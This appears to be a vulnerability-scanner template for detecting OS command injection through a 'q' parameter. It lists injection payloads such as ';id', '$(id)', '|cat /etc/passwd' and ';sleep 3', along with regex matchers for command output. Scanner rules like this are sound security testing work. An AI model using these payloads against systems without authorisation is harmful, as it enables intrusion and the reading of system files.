id: generic-command-injection
info:
  name: Command Injection - Multi-Tier
  description: OS command injection with output, blind, and time-based detection
  tags:
    - rce
    - command-injection
    - generic
    - blind

generic:
  endpoint: "{{command_injection}}"
  method: GET
  parameter: "q"

  # Multi-tier detection for command injection
  detection_tiers:
    # Tier 1: PASSIVE - Output-based detection
    - tier: passive
      detection_type: error_based
      payloads:
        - ";id"
        - "|id"
        - "&id"
        - "&&id"
        - "`id`"
        - "$(id)"
        - "' && id && echo '"
        - "' | id '"

      matchers:
        - type: regex
          condition: or
          regex:
            - "uid=\\d+.*gid=\\d+"
            - "root:x:0:0"
            - "www-data|apache|nobody|_www"
            - "total\\s+\\d+"
            - "drwxr-xr-x|drw-rw-rw"
            - "COMMAND_EXECUTED"
            - "uname|linux|darwin"

    # Tier 2: ACTIVE - Boolean-based detection
    - tier: active
      detection_type: boolean_blind
      baseline_payload: "test"
      true_payload: "test && echo TRUE"
      false_payload: "test && echo FALSE"

      matchers:
        - type: word
          words:
            - "TRUE"
          condition: and

    # Tier 3: AGGRESSIVE - Time-based detection (causes delays)
    - tier: aggressive
      detection_type: time_blind
      threshold_ms: 3000
      payloads:
        - ";sleep 3"
        - "|sleep 3"
        - "&&sleep 3"
        - "';sleep 3;'"
        - "|`sleep 3`"
        - "$(sleep 3)"

      matchers:
        - type: regex
          condition: or
          regex:
            - "uid="
            - "root:x"
          negative: true

    # Additional payloads for different OS
    - tier: aggressive
      detection_type: error_based
      payloads:
        # Unix/Linux
        - ";ls -la"
        - "|cat /etc/passwd"
        - "`whoami`"
        - "$(pwd)"
        # Windows
        - "&dir"
        - "|type C:\\Windows\\win.ini"
        - "&whoami"
        - "&ipconfig"
        # Blind indicators
        - ";echo COMMAND_INJECT"
        - "|echo COMMAND_INJECT"
        - "&ping -c 1 127.0.0.1 &"

      matchers:
        - type: regex
          condition: or
          regex:
            - "COMMAND_INJECT"
            - "uid=\\d+"
            - "root:x:0:0"
            - "Volume|Windows IP"
            - "\\[.*?\\]"
